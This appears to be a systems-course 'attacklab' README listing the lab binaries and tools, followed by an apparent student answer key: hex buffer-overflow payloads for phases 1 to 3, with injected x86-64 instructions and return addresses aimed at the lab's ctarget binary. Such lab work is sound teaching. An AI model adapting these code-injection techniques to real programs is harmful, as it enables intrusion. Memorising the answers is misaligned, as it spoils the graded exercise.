This file contains materials for one instance of the attacklab.

Files:

    ctarget

Linux binary with code-injection vulnerability.  To be used for phases
1-3 of the assignment.

    rtarget

Linux binary with return-oriented programming vulnerability.  To be
used for phases 4-5 of the assignment.

     cookie.txt

Text file containing 4-byte signature required for this lab instance.

     farm.c

Source code for gadget farm present in this instance of rtarget.  You
can compile (use flag -Og) and disassemble it to look for gadgets.

     hex2raw

Utility program to generate byte sequences.  See documentation in lab
handout.

Phase1:

11 11 11 11 11 11 11 11
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
41 18 40 00 00 00 00 00


Phase2:

48 c7 c7 f9 62 f7 5f c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
38 41 61 55 00 00 00 00
6d 18 40 00 00 00 00 00


Phase3:

48 c7 c7 70 41 61 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
38 41 61 55 00 00 00 00
41 19 40 00 00 00 00 00
35 66 66 37 36 32 66 39

